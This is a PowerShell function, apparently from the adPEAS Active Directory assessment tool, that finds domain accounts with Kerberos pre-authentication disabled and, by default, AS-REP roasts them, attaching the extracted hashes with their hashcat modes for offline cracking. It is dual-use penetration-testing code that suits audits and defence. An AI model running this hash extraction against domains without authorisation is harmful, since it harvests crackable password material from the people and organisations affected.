function Get-ASREPRoastableAccounts {
    <#
    .SYNOPSIS
    Detects user accounts vulnerable to AS-REP Roasting attacks.

    .DESCRIPTION
    Identifies user accounts with "Do not require Kerberos preauthentication" enabled (userAccountControl flag DONT_REQ_PREAUTH / 4194304).
    AS-REP Roasting allows attackers to request AS-REP responses without valid credentials, which can then be cracked offline to recover plaintext passwords.

    .PARAMETER Domain
    Target domain (optional, uses current domain if not specified)

    .PARAMETER Server
    Domain Controller to query (optional, uses auto-discovery if not specified)

    .PARAMETER Credential
    PSCredential object for authentication (optional, uses current user if not specified)

    .PARAMETER OPSEC
    When enabled, skips active AS-REP hash extraction (Kerberos AS-REQ without pre-authentication).
    Detection of vulnerable accounts via LDAP query is always performed (passive).
    Use this in environments where Kerberos traffic is monitored.

    .EXAMPLE
    Get-ASREPRoastableAccounts

    .EXAMPLE
    Get-ASREPRoastableAccounts -Domain "contoso.com" -Credential (Get-Credential)

    .NOTES
    Category: Creds
    Author: Alexander Sturz (@_61106960_)
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [switch]$OPSEC
    )

    begin {
        Write-Log "[Get-ASREPRoastableAccounts] Starting AS-REP Roastable accounts check"
    }

    process {
        try {
            # Build connection parameters (exclude OPSEC which Ensure-LDAPConnection doesn't accept)
            $connectionParams = @{}
            if ($Domain) { $connectionParams['Domain'] = $Domain }
            if ($Server) { $connectionParams['Server'] = $Server }
            if ($Credential) { $connectionParams['Credential'] = $Credential }

            # Ensure LDAP connection (displays error if needed)
            if (-not (Ensure-LDAPConnection @connectionParams)) {
                return
            }

            Show-SubHeader "Searching for AS-REP Roastable accounts (DONT_REQ_PREAUTH)..." -ObjectType "ASREPRoastable"

            $asrepRoastableUsers = Get-DomainUser -PreauthNotRequired -ShowOwner @connectionParams

            if (@($asrepRoastableUsers).Count -gt 0) {
                Show-Line "Found $(@($asrepRoastableUsers).Count) AS-REP Roastable account(s):" -Class "Finding"

                # Determine if we should extract hashes (not in OPSEC mode)
                $canTestASREPRoast = -not $OPSEC

                if ($OPSEC) {
                    Show-Line "Skipping hash extraction (OPSEC mode)" -Class "Hint"
                }

                $totalUsers = @($asrepRoastableUsers).Count
                $currentIndex = 0
                foreach ($user in $asrepRoastableUsers) {
                    $currentIndex++
                    if ($totalUsers -gt $Script:ProgressThreshold) { Show-Progress -Activity "Analyzing AS-REP Roastable accounts" -Current $currentIndex -Total $totalUsers -ObjectName $user.sAMAccountName }
                    # If testing enabled, perform AS-REP Roast and add hash as attribute
                    if ($canTestASREPRoast) {
                        $testDomain = if ($Domain) { $Domain } else { $Script:LDAPContext.Domain }
                        $testDC = if ($Server) { $Server } else { $Script:LDAPContext.Server }

                        $roastResult = Invoke-ASREPRoast -SAMAccountName $user.sAMAccountName -Domain $testDomain -DomainController $testDC

                        if ($roastResult.Success -and $roastResult.Hash) {
                            # Determine hashcat mode based on encryption type
                            $hashcatMode = switch ($roastResult.EncryptionType) {
                                23 { 18200 }  # RC4
                                17 { 19600 }  # AES128
                                18 { 19700 }  # AES256
                                default { 18200 }
                            }

                            # Add hash info as attributes to the user object
                            $hashLabel = "Hashcat (mode $hashcatMode, $($roastResult.EncryptionTypeName))"
                            $user | Add-Member -NotePropertyName 'ASREPRoastingHash' -NotePropertyValue $roastResult.Hash -Force
                            $user | Add-Member -NotePropertyName 'ASREPRoastingHashType' -NotePropertyValue $hashLabel -Force
                            $user | Add-Member -NotePropertyName 'ASREPRoastEncryption' -NotePropertyValue $roastResult.EncryptionType -Force
                        }
                        elseif ($roastResult.Error) {
                            $user | Add-Member -NotePropertyName 'ASREPRoastError' -NotePropertyValue "Failed: $($roastResult.Error)" -Force
                        }
                    }

                    $user | Add-Member -NotePropertyName '_adPEASObjectType' -NotePropertyValue 'ASREPRoastable' -Force
                    Show-Object $user

                    # Blank line between accounts for readability
                    Show-EmptyLine
                }
                if ($totalUsers -gt $Script:ProgressThreshold) { Show-Progress -Activity "Analyzing AS-REP Roastable accounts" -Completed }
            } else {
                Show-Line "No AS-REP Roastable accounts found" -Class "Secure"
            }

        } catch {
            Write-Log "[Get-ASREPRoastableAccounts] Error: $_" -Level Error
        }
    }

    end {
        Write-Log "[Get-ASREPRoastableAccounts] Check completed"
    }
}
